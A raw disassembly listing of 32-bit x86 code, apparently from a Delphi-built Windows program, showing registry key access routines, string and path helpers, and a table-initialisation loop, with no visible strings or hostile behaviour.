  409439:	8d 40 00             	lea    0x0(%eax),%eax
  40943c:	53                   	push   %ebx
  40943d:	56                   	push   %esi
  40943e:	8b da                	mov    %edx,%ebx
  409440:	8b f0                	mov    %eax,%esi
  409442:	8b c6                	mov    %esi,%eax
  409444:	e8 1b 00 00 00       	call   0x409464
  409449:	33 d2                	xor    %edx,%edx
  40944b:	8b c6                	mov    %esi,%eax
  40944d:	e8 6e 95 ff ff       	call   0x4029c0
  409452:	84 db                	test   %bl,%bl
  409454:	74 07                	je     0x40945d
  409456:	8b c6                	mov    %esi,%eax
  409458:	e8 4f 97 ff ff       	call   0x402bac
  40945d:	8b c6                	mov    %esi,%eax
  40945f:	5e                   	pop    %esi
  409460:	5b                   	pop    %ebx
  409461:	c3                   	ret
  409462:	8b c0                	mov    %eax,%eax
  409464:	53                   	push   %ebx
  409465:	8b d8                	mov    %eax,%ebx
  409467:	8b 43 04             	mov    0x4(%ebx),%eax
  40946a:	85 c0                	test   %eax,%eax
  40946c:	74 21                	je     0x40948f
  40946e:	80 7b 0c 00          	cmpb   $0x0,0xc(%ebx)
  409472:	74 08                	je     0x40947c
  409474:	50                   	push   %eax
  409475:	e8 32 b1 ff ff       	call   0x4045ac
  40947a:	eb 06                	jmp    0x409482
  40947c:	50                   	push   %eax
  40947d:	e8 3a b1 ff ff       	call   0x4045bc
  409482:	33 c0                	xor    %eax,%eax
  409484:	89 43 04             	mov    %eax,0x4(%ebx)
  409487:	8d 43 10             	lea    0x10(%ebx),%eax
  40948a:	e8 51 9c ff ff       	call   0x4030e0
  40948f:	5b                   	pop    %ebx
  409490:	c3                   	ret
  409491:	8d 40 00             	lea    0x0(%eax),%eax
  409494:	53                   	push   %ebx
  409495:	56                   	push   %esi
  409496:	8b f2                	mov    %edx,%esi
  409498:	8b d8                	mov    %eax,%ebx
  40949a:	8b 43 08             	mov    0x8(%ebx),%eax
  40949d:	3b f0                	cmp    %eax,%esi
  40949f:	74 1a                	je     0x4094bb
  4094a1:	80 7b 14 00          	cmpb   $0x0,0x14(%ebx)
  4094a5:	74 0a                	je     0x4094b1
  4094a7:	50                   	push   %eax
  4094a8:	e8 ff b0 ff ff       	call   0x4045ac
  4094ad:	c6 43 14 00          	movb   $0x0,0x14(%ebx)
  4094b1:	89 73 08             	mov    %esi,0x8(%ebx)
  4094b4:	8b c3                	mov    %ebx,%eax
  4094b6:	e8 a9 ff ff ff       	call   0x409464
  4094bb:	5e                   	pop    %esi
  4094bc:	5b                   	pop    %ebx
  4094bd:	c3                   	ret
  4094be:	8b c0                	mov    %eax,%eax
  4094c0:	53                   	push   %ebx
  4094c1:	56                   	push   %esi
  4094c2:	57                   	push   %edi
  4094c3:	8b f9                	mov    %ecx,%edi
  4094c5:	8b f2                	mov    %edx,%esi
  4094c7:	8b d8                	mov    %eax,%ebx
  4094c9:	8b c3                	mov    %ebx,%eax
  4094cb:	e8 94 ff ff ff       	call   0x409464
  4094d0:	89 73 04             	mov    %esi,0x4(%ebx)
  4094d3:	8d 43 10             	lea    0x10(%ebx),%eax
  4094d6:	8b d7                	mov    %edi,%edx
  4094d8:	e8 53 9c ff ff       	call   0x403130
  4094dd:	5f                   	pop    %edi
  4094de:	5e                   	pop    %esi
  4094df:	5b                   	pop    %ebx
  4094e0:	c3                   	ret
  4094e1:	8d 40 00             	lea    0x0(%eax),%eax
  4094e4:	8b 48 04             	mov    0x4(%eax),%ecx
  4094e7:	85 c9                	test   %ecx,%ecx
  4094e9:	74 04                	je     0x4094ef
  4094eb:	84 d2                	test   %dl,%dl
  4094ed:	75 04                	jne    0x4094f3
  4094ef:	8b 40 08             	mov    0x8(%eax),%eax
  4094f2:	c3                   	ret
  4094f3:	8b c1                	mov    %ecx,%eax
  4094f5:	c3                   	ret
  4094f6:	8b c0                	mov    %eax,%eax
  4094f8:	55                   	push   %ebp
  4094f9:	8b ec                	mov    %esp,%ebp
  4094fb:	83 c4 f0             	add    $0xfffffff0,%esp
  4094fe:	53                   	push   %ebx
  4094ff:	56                   	push   %esi
  409500:	57                   	push   %edi
  409501:	33 db                	xor    %ebx,%ebx
  409503:	89 5d f4             	mov    %ebx,-0xc(%ebp)
  409506:	88 4d ff             	mov    %cl,-0x1(%ebp)
  409509:	8b da                	mov    %edx,%ebx
  40950b:	8b f0                	mov    %eax,%esi
  40950d:	33 c0                	xor    %eax,%eax
  40950f:	55                   	push   %ebp
  409510:	68 00 96 40 00       	push   $0x409600
  409515:	64 ff 30             	push   %fs:(%eax)
  409518:	64 89 20             	mov    %esp,%fs:(%eax)
  40951b:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40951e:	8b d3                	mov    %ebx,%edx
  409520:	e8 4f 9c ff ff       	call   0x403174
  409525:	8b 45 f4             	mov    -0xc(%ebp),%eax
  409528:	e8 6b fe ff ff       	call   0x409398
  40952d:	8b d8                	mov    %eax,%ebx
  40952f:	84 db                	test   %bl,%bl
  409531:	75 12                	jne    0x409545
  409533:	8d 45 f4             	lea    -0xc(%ebp),%eax
  409536:	b9 01 00 00 00       	mov    $0x1,%ecx
  40953b:	ba 01 00 00 00       	mov    $0x1,%edx
  409540:	e8 df 9e ff ff       	call   0x403424
  409545:	33 c0                	xor    %eax,%eax
  409547:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40954a:	80 7d ff 00          	cmpb   $0x0,-0x1(%ebp)
  40954e:	74 06                	je     0x409556
  409550:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  409554:	75 2b                	jne    0x409581
  409556:	8d 45 f8             	lea    -0x8(%ebp),%eax
  409559:	50                   	push   %eax
  40955a:	68 3f 00 0f 00       	push   $0xf003f
  40955f:	6a 00                	push   $0x0
  409561:	8b 45 f4             	mov    -0xc(%ebp),%eax
  409564:	e8 3b 9e ff ff       	call   0x4033a4
  409569:	50                   	push   %eax
  40956a:	8b d3                	mov    %ebx,%edx
  40956c:	8b c6                	mov    %esi,%eax
  40956e:	e8 71 ff ff ff       	call   0x4094e4
  409573:	50                   	push   %eax
  409574:	e8 4b b0 ff ff       	call   0x4045c4
  409579:	85 c0                	test   %eax,%eax
  40957b:	0f 94 45 fe          	sete   -0x2(%ebp)
  40957f:	eb 33                	jmp    0x4095b4
  409581:	8d 45 f0             	lea    -0x10(%ebp),%eax
  409584:	50                   	push   %eax
  409585:	8d 45 f8             	lea    -0x8(%ebp),%eax
  409588:	50                   	push   %eax
  409589:	6a 00                	push   $0x0
  40958b:	68 3f 00 0f 00       	push   $0xf003f
  409590:	6a 00                	push   $0x0
  409592:	6a 00                	push   $0x0
  409594:	6a 00                	push   $0x0
  409596:	8b 45 f4             	mov    -0xc(%ebp),%eax
  409599:	e8 06 9e ff ff       	call   0x4033a4
  40959e:	50                   	push   %eax
  40959f:	8b d3                	mov    %ebx,%edx
  4095a1:	8b c6                	mov    %esi,%eax
  4095a3:	e8 3c ff ff ff       	call   0x4094e4
  4095a8:	50                   	push   %eax
  4095a9:	e8 06 b0 ff ff       	call   0x4045b4
  4095ae:	85 c0                	test   %eax,%eax
  4095b0:	0f 94 45 fe          	sete   -0x2(%ebp)
  4095b4:	80 7d fe 00          	cmpb   $0x0,-0x2(%ebp)
  4095b8:	74 30                	je     0x4095ea
  4095ba:	83 7e 04 00          	cmpl   $0x0,0x4(%esi)
  4095be:	0f 95 c0             	setne  %al
  4095c1:	84 d8                	test   %bl,%al
  4095c3:	74 18                	je     0x4095dd
  4095c5:	ff 76 10             	push   0x10(%esi)
  4095c8:	68 1c 96 40 00       	push   $0x40961c
  4095cd:	ff 75 f4             	push   -0xc(%ebp)
  4095d0:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4095d3:	ba 03 00 00 00       	mov    $0x3,%edx
  4095d8:	e8 c3 9c ff ff       	call   0x4032a0
  4095dd:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4095e0:	8b 55 f8             	mov    -0x8(%ebp),%edx
  4095e3:	8b c6                	mov    %esi,%eax
  4095e5:	e8 d6 fe ff ff       	call   0x4094c0
  4095ea:	33 c0                	xor    %eax,%eax
  4095ec:	5a                   	pop    %edx
  4095ed:	59                   	pop    %ecx
  4095ee:	59                   	pop    %ecx
  4095ef:	64 89 10             	mov    %edx,%fs:(%eax)
  4095f2:	68 07 96 40 00       	push   $0x409607
  4095f7:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4095fa:	e8 e1 9a ff ff       	call   0x4030e0
  4095ff:	c3                   	ret
  409600:	e9 5b 97 ff ff       	jmp    0x402d60
  409605:	eb f0                	jmp    0x4095f7
  409607:	8a 45 fe             	mov    -0x2(%ebp),%al
  40960a:	5f                   	pop    %edi
  40960b:	5e                   	pop    %esi
  40960c:	5b                   	pop    %ebx
  40960d:	8b e5                	mov    %ebp,%esp
  40960f:	5d                   	pop    %ebp
  409610:	c3                   	ret
  409611:	00 00                	add    %al,(%eax)
  409613:	00 ff                	add    %bh,%bh
  409615:	ff                   	(bad)
  409616:	ff                   	(bad)
  409617:	ff 01                	incl   (%ecx)
  409619:	00 00                	add    %al,(%eax)
  40961b:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  40961f:	00 53 56             	add    %dl,0x56(%ebx)
  409622:	57                   	push   %edi
  409623:	55                   	push   %ebp
  409624:	51                   	push   %ecx
  409625:	8b e9                	mov    %ecx,%ebp
  409627:	8b fa                	mov    %edx,%edi
  409629:	8b f0                	mov    %eax,%esi
  40962b:	8b c5                	mov    %ebp,%eax
  40962d:	33 c9                	xor    %ecx,%ecx
  40962f:	ba 08 00 00 00       	mov    $0x8,%edx
  409634:	e8 eb 91 ff ff       	call   0x402824
  409639:	8d 45 04             	lea    0x4(%ebp),%eax
  40963c:	50                   	push   %eax
  40963d:	6a 00                	push   $0x0
  40963f:	8d 44 24 08          	lea    0x8(%esp),%eax
  409643:	50                   	push   %eax
  409644:	6a 00                	push   $0x0
  409646:	8b c7                	mov    %edi,%eax
  409648:	e8 57 9d ff ff       	call   0x4033a4
  40964d:	50                   	push   %eax
  40964e:	8b 46 04             	mov    0x4(%esi),%eax
  409651:	50                   	push   %eax
  409652:	e8 75 af ff ff       	call   0x4045cc
  409657:	85 c0                	test   %eax,%eax
  409659:	0f 94 c3             	sete   %bl
  40965c:	8b 04 24             	mov    (%esp),%eax
  40965f:	e8 78 fd ff ff       	call   0x4093dc
  409664:	88 45 00             	mov    %al,0x0(%ebp)
  409667:	8b c3                	mov    %ebx,%eax
  409669:	5a                   	pop    %edx
  40966a:	5d                   	pop    %ebp
  40966b:	5f                   	pop    %edi
  40966c:	5e                   	pop    %esi
  40966d:	5b                   	pop    %ebx
  40966e:	c3                   	ret
  40966f:	90                   	nop
  409670:	53                   	push   %ebx
  409671:	56                   	push   %esi
  409672:	83 c4 f8             	add    $0xfffffff8,%esp
  409675:	8b f2                	mov    %edx,%esi
  409677:	8b d8                	mov    %eax,%ebx
  409679:	8b cc                	mov    %esp,%ecx
  40967b:	8b d6                	mov    %esi,%edx
  40967d:	8b c3                	mov    %ebx,%eax
  40967f:	e8 9c ff ff ff       	call   0x409620
  409684:	84 c0                	test   %al,%al
  409686:	74 06                	je     0x40968e
  409688:	8b 44 24 04          	mov    0x4(%esp),%eax
  40968c:	eb 03                	jmp    0x409691
  40968e:	83 c8 ff             	or     $0xffffffff,%eax
  409691:	59                   	pop    %ecx
  409692:	5a                   	pop    %edx
  409693:	5e                   	pop    %esi
  409694:	5b                   	pop    %ebx
  409695:	c3                   	ret
  409696:	8b c0                	mov    %eax,%eax
  409698:	53                   	push   %ebx
  409699:	56                   	push   %esi
  40969a:	57                   	push   %edi
  40969b:	8b f1                	mov    %ecx,%esi
  40969d:	8b fa                	mov    %edx,%edi
  40969f:	8b d8                	mov    %eax,%ebx
  4096a1:	8b c6                	mov    %esi,%eax
  4096a3:	e8 ac 9b ff ff       	call   0x403254
  4096a8:	50                   	push   %eax
  4096a9:	6a 01                	push   $0x1
  4096ab:	8b c6                	mov    %esi,%eax
  4096ad:	e8 f2 9c ff ff       	call   0x4033a4
  4096b2:	8b c8                	mov    %eax,%ecx
  4096b4:	8b d7                	mov    %edi,%edx
  4096b6:	8b c3                	mov    %ebx,%eax
  4096b8:	e8 7f 00 00 00       	call   0x40973c
  4096bd:	5f                   	pop    %edi
  4096be:	5e                   	pop    %esi
  4096bf:	5b                   	pop    %ebx
  4096c0:	c3                   	ret
  4096c1:	8d 40 00             	lea    0x0(%eax),%eax
  4096c4:	53                   	push   %ebx
  4096c5:	56                   	push   %esi
  4096c6:	57                   	push   %edi
  4096c7:	55                   	push   %ebp
  4096c8:	51                   	push   %ecx
  4096c9:	8b f9                	mov    %ecx,%edi
  4096cb:	8b ea                	mov    %edx,%ebp
  4096cd:	8b f0                	mov    %eax,%esi
  4096cf:	8b d5                	mov    %ebp,%edx
  4096d1:	8b c6                	mov    %esi,%eax
  4096d3:	e8 98 ff ff ff       	call   0x409670
  4096d8:	8b d8                	mov    %eax,%ebx
  4096da:	85 db                	test   %ebx,%ebx
  4096dc:	7e 4f                	jle    0x40972d
  4096de:	8b c7                	mov    %edi,%eax
  4096e0:	8b cb                	mov    %ebx,%ecx
  4096e2:	33 d2                	xor    %edx,%edx
  4096e4:	e8 d7 9a ff ff       	call   0x4031c0
  4096e9:	53                   	push   %ebx
  4096ea:	8d 44 24 04          	lea    0x4(%esp),%eax
  4096ee:	50                   	push   %eax
  4096ef:	8b 07                	mov    (%edi),%eax
  4096f1:	e8 ae 9c ff ff       	call   0x4033a4
  4096f6:	8b c8                	mov    %eax,%ecx
  4096f8:	8b d5                	mov    %ebp,%edx
  4096fa:	8b c6                	mov    %esi,%eax
  4096fc:	e8 a3 00 00 00       	call   0x4097a4
  409701:	80 3c 24 01          	cmpb   $0x1,(%esp)
  409705:	74 06                	je     0x40970d
  409707:	80 3c 24 02          	cmpb   $0x2,(%esp)
  40970b:	75 17                	jne    0x409724
  40970d:	8b 07                	mov    (%edi),%eax
  40970f:	e8 90 9c ff ff       	call   0x4033a4
  409714:	e8 13 ba ff ff       	call   0x40512c
  409719:	8b d0                	mov    %eax,%edx
  40971b:	8b c7                	mov    %edi,%eax
  40971d:	e8 92 9d ff ff       	call   0x4034b4
  409722:	eb 10                	jmp    0x409734
  409724:	8b c5                	mov    %ebp,%eax
  409726:	e8 41 fc ff ff       	call   0x40936c
  40972b:	eb 07                	jmp    0x409734
  40972d:	8b c7                	mov    %edi,%eax
  40972f:	e8 ac 99 ff ff       	call   0x4030e0
  409734:	5a                   	pop    %edx
  409735:	5d                   	pop    %ebp
  409736:	5f                   	pop    %edi
  409737:	5e                   	pop    %esi
  409738:	5b                   	pop    %ebx
  409739:	c3                   	ret
  40973a:	8b c0                	mov    %eax,%eax
  40973c:	55                   	push   %ebp
  40973d:	8b ec                	mov    %esp,%ebp
  40973f:	83 c4 f4             	add    $0xfffffff4,%esp
  409742:	53                   	push   %ebx
  409743:	56                   	push   %esi
  409744:	57                   	push   %edi
  409745:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  409748:	8b fa                	mov    %edx,%edi
  40974a:	8b d8                	mov    %eax,%ebx
  40974c:	8a 45 08             	mov    0x8(%ebp),%al
  40974f:	e8 58 fc ff ff       	call   0x4093ac
  409754:	8b f0                	mov    %eax,%esi
  409756:	8b 45 0c             	mov    0xc(%ebp),%eax
  409759:	50                   	push   %eax
  40975a:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40975d:	50                   	push   %eax
  40975e:	56                   	push   %esi
  40975f:	6a 00                	push   $0x0
  409761:	8b c7                	mov    %edi,%eax
  409763:	e8 3c 9c ff ff       	call   0x4033a4
  409768:	50                   	push   %eax
  409769:	8b 43 04             	mov    0x4(%ebx),%eax
  40976c:	50                   	push   %eax
  40976d:	e8 62 ae ff ff       	call   0x4045d4
  409772:	85 c0                	test   %eax,%eax
  409774:	74 23                	je     0x409799
  409776:	89 7d f4             	mov    %edi,-0xc(%ebp)
  409779:	c6 45 f8 0b          	movb   $0xb,-0x8(%ebp)
  40977d:	8d 45 f4             	lea    -0xc(%ebp),%eax
  409780:	50                   	push   %eax
  409781:	6a 00                	push   $0x0
  409783:	b9 bc f0 00 00       	mov    $0xf0bc,%ecx
  409788:	b2 01                	mov    $0x1,%dl
  40978a:	b8 08 93 40 00       	mov    $0x409308,%eax
  40978f:	e8 08 d1 ff ff       	call   0x40689c
  409794:	e8 7f 96 ff ff       	call   0x402e18
  409799:	5f                   	pop    %edi
  40979a:	5e                   	pop    %esi
  40979b:	5b                   	pop    %ebx
  40979c:	8b e5                	mov    %ebp,%esp
  40979e:	5d                   	pop    %ebp
  40979f:	c2 08 00             	ret    $0x8
  4097a2:	8b c0                	mov    %eax,%eax
  4097a4:	55                   	push   %ebp
  4097a5:	8b ec                	mov    %esp,%ebp
  4097a7:	83 c4 f4             	add    $0xfffffff4,%esp
  4097aa:	53                   	push   %ebx
  4097ab:	56                   	push   %esi
  4097ac:	57                   	push   %edi
  4097ad:	8b f9                	mov    %ecx,%edi
  4097af:	8b f2                	mov    %edx,%esi
  4097b1:	8b d8                	mov    %eax,%ebx
  4097b3:	33 c0                	xor    %eax,%eax
  4097b5:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4097b8:	8d 45 0c             	lea    0xc(%ebp),%eax
  4097bb:	50                   	push   %eax
  4097bc:	57                   	push   %edi
  4097bd:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4097c0:	50                   	push   %eax
  4097c1:	6a 00                	push   $0x0
  4097c3:	8b c6                	mov    %esi,%eax
  4097c5:	e8 da 9b ff ff       	call   0x4033a4
  4097ca:	50                   	push   %eax
  4097cb:	8b 43 04             	mov    0x4(%ebx),%eax
  4097ce:	50                   	push   %eax
  4097cf:	e8 f8 ad ff ff       	call   0x4045cc
  4097d4:	85 c0                	test   %eax,%eax
  4097d6:	74 23                	je     0x4097fb
  4097d8:	89 75 f4             	mov    %esi,-0xc(%ebp)
  4097db:	c6 45 f8 0b          	movb   $0xb,-0x8(%ebp)
  4097df:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4097e2:	50                   	push   %eax
  4097e3:	6a 00                	push   $0x0
  4097e5:	b9 bd f0 00 00       	mov    $0xf0bd,%ecx
  4097ea:	b2 01                	mov    $0x1,%dl
  4097ec:	b8 08 93 40 00       	mov    $0x409308,%eax
  4097f1:	e8 a6 d0 ff ff       	call   0x40689c
  4097f6:	e8 1d 96 ff ff       	call   0x402e18
  4097fb:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  4097fe:	8b 45 fc             	mov    -0x4(%ebp),%eax
  409801:	e8 d6 fb ff ff       	call   0x4093dc
  409806:	8b 55 08             	mov    0x8(%ebp),%edx
  409809:	88 02                	mov    %al,(%edx)
  40980b:	8b c3                	mov    %ebx,%eax
  40980d:	5f                   	pop    %edi
  40980e:	5e                   	pop    %esi
  40980f:	5b                   	pop    %ebx
  409810:	8b e5                	mov    %ebp,%esp
  409812:	5d                   	pop    %ebp
  409813:	c2 08 00             	ret    $0x8
  409816:	8b c0                	mov    %eax,%eax
  409818:	83 c4 f8             	add    $0xfffffff8,%esp
  40981b:	8b cc                	mov    %esp,%ecx
  40981d:	e8 fe fd ff ff       	call   0x409620
  409822:	59                   	pop    %ecx
  409823:	5a                   	pop    %edx
  409824:	c3                   	ret
  409825:	8d 40 00             	lea    0x0(%eax),%eax
  409828:	ff 25 cc c1 41 00    	jmp    *0x41c1cc
  40982e:	8b c0                	mov    %eax,%eax
  409830:	53                   	push   %ebx
  409831:	56                   	push   %esi
  409832:	33 d2                	xor    %edx,%edx
  409834:	b1 01                	mov    $0x1,%cl
  409836:	66 be 00 ee          	mov    $0xee00,%si
  40983a:	b8 bc c7 40 00       	mov    $0x40c7bc,%eax
  40983f:	88 10                	mov    %dl,(%eax)
  409841:	33 db                	xor    %ebx,%ebx
  409843:	8a d9                	mov    %cl,%bl
  409845:	03 d3                	add    %ebx,%edx
  409847:	81 fa ff 00 00 00    	cmp    $0xff,%edx
  40984d:	7e 0a                	jle    0x409859
  40984f:	33 d2                	xor    %edx,%edx
  409851:	41                   	inc    %ecx
  409852:	80 f9 fa             	cmp    $0xfa,%cl
  409855:	76 02                	jbe    0x409859
  409857:	b1 01                	mov    $0x1,%cl
  409859:	40                   	inc    %eax
  40985a:	66 ff ce             	dec    %si
  40985d:	75 e0                	jne    0x40983f
  40985f:	5e                   	pop    %esi
  409860:	5b                   	pop    %ebx
  409861:	c3                   	ret
  409862:	8b c0                	mov    %eax,%eax
  409864:	55                   	push   %ebp
  409865:	8b ec                	mov    %esp,%ebp
  409867:	83 c4 f0             	add    $0xfffffff0,%esp
  40986a:	53                   	push   %ebx
  40986b:	56                   	push   %esi
  40986c:	57                   	push   %edi
  40986d:	33 c9                	xor    %ecx,%ecx
  40986f:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  409872:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  409875:	8b f2                	mov    %edx,%esi
  409877:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40987a:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40987d:	e8 12 9b ff ff       	call   0x403394
  409882:	33 c0                	xor    %eax,%eax
  409884:	55                   	push   %ebp
  409885:	68 04 99 40 00       	push   $0x409904
  40988a:	64 ff 30             	push   %fs:(%eax)
  40988d:	64 89 20             	mov    %esp,%fs:(%eax)
  409890:	8d 45 f8             	lea    -0x8(%ebp),%eax
  409893:	e8 48 98 ff ff       	call   0x4030e0
  409898:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40989b:	e8 b4 99 ff ff       	call   0x403254
  4098a0:	8b d8                	mov    %eax,%ebx
  4098a2:	84 db                	test   %bl,%bl
  4098a4:	76 31                	jbe    0x4098d7
  4098a6:	c6 45 f7 01          	movb   $0x1,-0x9(%ebp)
  4098aa:	33 c0                	xor    %eax,%eax
  4098ac:	8a 45 f7             	mov    -0x9(%ebp),%al
  4098af:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4098b2:	8a 44 02 ff          	mov    -0x1(%edx,%eax,1),%al
  4098b6:	e8 4d 8f ff ff       	call   0x402808
  4098bb:	8b d0                	mov    %eax,%edx
  4098bd:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4098c0:	e8 2b 99 ff ff       	call   0x4031f0
  4098c5:	8b 55 f0             	mov    -0x10(%ebp),%edx
  4098c8:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4098cb:	e8 8c 99 ff ff       	call   0x40325c
  4098d0:	fe 45 f7             	incb   -0x9(%ebp)
  4098d3:	fe cb                	dec    %bl
  4098d5:	75 d3                	jne    0x4098aa
  4098d7:	8b c6                	mov    %esi,%eax
  4098d9:	8b 55 f8             	mov    -0x8(%ebp),%edx
  4098dc:	e8 93 98 ff ff       	call   0x403174
  4098e1:	33 c0                	xor    %eax,%eax
  4098e3:	5a                   	pop    %edx
  4098e4:	59                   	pop    %ecx
  4098e5:	59                   	pop    %ecx
  4098e6:	64 89 10             	mov    %edx,%fs:(%eax)
  4098e9:	68 0b 99 40 00       	push   $0x40990b
  4098ee:	8d 45 f0             	lea    -0x10(%ebp),%eax
  4098f1:	e8 ea 97 ff ff       	call   0x4030e0
  4098f6:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4098f9:	ba 02 00 00 00       	mov    $0x2,%edx
  4098fe:	e8 fd 97 ff ff       	call   0x403100
  409903:	c3                   	ret
  409904:	e9 57 94 ff ff       	jmp    0x402d60
  409909:	eb e3                	jmp    0x4098ee
  40990b:	5f                   	pop    %edi
  40990c:	5e                   	pop    %esi
  40990d:	5b                   	pop    %ebx
  40990e:	8b e5                	mov    %ebp,%esp
  409910:	5d                   	pop    %ebp
  409911:	c3                   	ret
  409912:	8b c0                	mov    %eax,%eax
  409914:	55                   	push   %ebp
  409915:	8b ec                	mov    %esp,%ebp
  409917:	83 c4 8c             	add    $0xffffff8c,%esp
  40991a:	53                   	push   %ebx
  40991b:	56                   	push   %esi
  40991c:	57                   	push   %edi
  40991d:	33 c0                	xor    %eax,%eax
  40991f:	89 45 94             	mov    %eax,-0x6c(%ebp)
  409922:	89 45 90             	mov    %eax,-0x70(%ebp)
  409925:	89 45 8c             	mov    %eax,-0x74(%ebp)
  409928:	33 c0                	xor    %eax,%eax
  40992a:	55                   	push   %ebp
  40992b:	68 da 9b 40 00       	push   $0x409bda
  409930:	64 ff 30             	push   %fs:(%eax)
  409933:	64 89 20             	mov    %esp,%fs:(%eax)
  409936:	e8 f5 fe ff ff       	call   0x409830
  40993b:	b8 e8 9b 40 00       	mov    $0x409be8,%eax
  409940:	89 45 98             	mov    %eax,-0x68(%ebp)
  409943:	c7 45 9c 03 00 00 00 	movl   $0x3,-0x64(%ebp)
  40994a:	b8 00 9c 40 00       	mov    $0x409c00,%eax
  40994f:	89 45 a0             	mov    %eax,-0x60(%ebp)
  409952:	c7 45 a4 f1 03 00 00 	movl   $0x3f1,-0x5c(%ebp)
  409959:	b8 1c 9c 40 00       	mov    $0x409c1c,%eax
  40995e:	89 45 a8             	mov    %eax,-0x58(%ebp)
  409961:	c7 45 ac 1e 01 00 00 	movl   $0x11e,-0x54(%ebp)
  409968:	b8 2c 9c 40 00       	mov    $0x409c2c,%eax
  40996d:	89 45 b0             	mov    %eax,-0x50(%ebp)
  409970:	c7 45 b4 05 00 00 00 	movl   $0x5,-0x4c(%ebp)
  409977:	b8 4c 9c 40 00       	mov    $0x409c4c,%eax
  40997c:	89 45 b8             	mov    %eax,-0x48(%ebp)
  40997f:	c7 45 bc 04 00 00 00 	movl   $0x4,-0x44(%ebp)
  409986:	b8 60 9c 40 00       	mov    $0x409c60,%eax
  40998b:	89 45 c0             	mov    %eax,-0x40(%ebp)
  40998e:	c7 45 c4 04 01 00 00 	movl   $0x104,-0x3c(%ebp)
  409995:	b8 80 9c 40 00       	mov    $0x409c80,%eax
  40999a:	89 45 c8             	mov    %eax,-0x38(%ebp)
  40999d:	c7 45 cc 02 00 00 00 	movl   $0x2,-0x34(%ebp)
  4099a4:	b8 90 9c 40 00       	mov    $0x409c90,%eax
  4099a9:	89 45 d0             	mov    %eax,-0x30(%ebp)
  4099ac:	c7 45 d4 cd 00 00 00 	movl   $0xcd,-0x2c(%ebp)
  4099b3:	b8 a4 9c 40 00       	mov    $0x409ca4,%eax
  4099b8:	89 45 d8             	mov    %eax,-0x28(%ebp)
  4099bb:	c7 45 dc eb 00 00 00 	movl   $0xeb,-0x24(%ebp)
  4099c2:	b8 b8 9c 40 00       	mov    $0x409cb8,%eax
  4099c7:	89 45 e0             	mov    %eax,-0x20(%ebp)
  4099ca:	c7 45 e4 44 02 00 00 	movl   $0x244,-0x1c(%ebp)
  4099d1:	b8 cc 9c 40 00       	mov    $0x409ccc,%eax
  4099d6:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4099d9:	c7 45 ec 01 00 00 00 	movl   $0x1,-0x14(%ebp)
  4099e0:	b8 ec 9c 40 00       	mov    $0x409cec,%eax
  4099e5:	89 45 f0             	mov    %eax,-0x10(%ebp)
  4099e8:	c7 45 f4 08 00 00 00 	movl   $0x8,-0xc(%ebp)
  4099ef:	b8 0c 9d 40 00       	mov    $0x409d0c,%eax
  4099f4:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4099f7:	c7 45 fc 04 00 00 00 	movl   $0x4,-0x4(%ebp)
  4099fe:	b3 0d                	mov    $0xd,%bl
  409a00:	8d 7d 98             	lea    -0x68(%ebp),%edi
  409a03:	8b 15 68 c6 40 00    	mov    0x40c668,%edx
  409a09:	8d 45 94             	lea    -0x6c(%ebp),%eax
  409a0c:	e8 63 97 ff ff       	call   0x403174
  409a11:	8d 45 94             	lea    -0x6c(%ebp),%eax
  409a14:	ba 2c 9d 40 00       	mov    $0x409d2c,%edx
  409a19:	e8 3e 98 ff ff       	call   0x40325c
  409a1e:	8d 45 94             	lea    -0x6c(%ebp),%eax
  409a21:	50                   	push   %eax
  409a22:	8d 45 90             	lea    -0x70(%ebp),%eax
  409a25:	8b 17                	mov    (%edi),%edx
  409a27:	e8 e0 97 ff ff       	call   0x40320c
  409a2c:	8b 55 90             	mov    -0x70(%ebp),%edx
  409a2f:	58                   	pop    %eax
  409a30:	e8 27 98 ff ff       	call   0x40325c
  409a35:	8d 45 94             	lea    -0x6c(%ebp),%eax
  409a38:	ba 38 9d 40 00       	mov    $0x409d38,%edx
  409a3d:	e8 1a 98 ff ff       	call   0x40325c
  409a42:	8b 45 94             	mov    -0x6c(%ebp),%eax
  409a45:	e8 6e b4 ff ff       	call   0x404eb8
  409a4a:	84 c0                	test   %al,%al
  409a4c:	0f 85 62 01 00 00    	jne    0x409bb4
  409a52:	6a 00                	push   $0x0
  409a54:	8b 15 68 c6 40 00    	mov    0x40c668,%edx
  409a5a:	8d 45 94             	lea    -0x6c(%ebp),%eax
  409a5d:	e8 12 97 ff ff       	call   0x403174
  409a62:	8d 45 94             	lea    -0x6c(%ebp),%eax
  409a65:	ba 2c 9d 40 00       	mov    $0x409d2c,%edx
  409a6a:	e8 ed 97 ff ff       	call   0x40325c
  409a6f:	8d 45 94             	lea    -0x6c(%ebp),%eax
  409a72:	50                   	push   %eax
  409a73:	8d 45 90             	lea    -0x70(%ebp),%eax
  409a76:	8b 17                	mov    (%edi),%edx
  409a78:	e8 8f 97 ff ff       	call   0x40320c
  409a7d:	8b 55 90             	mov    -0x70(%ebp),%edx
  409a80:	58                   	pop    %eax
  409a81:	e8 d6 97 ff ff       	call   0x40325c
  409a86:	8d 45 94             	lea    -0x6c(%ebp),%eax
  409a89:	ba 38 9d 40 00       	mov    $0x409d38,%edx
  409a8e:	e8 c9 97 ff ff       	call   0x40325c
  409a93:	8b 45 94             	mov    -0x6c(%ebp),%eax
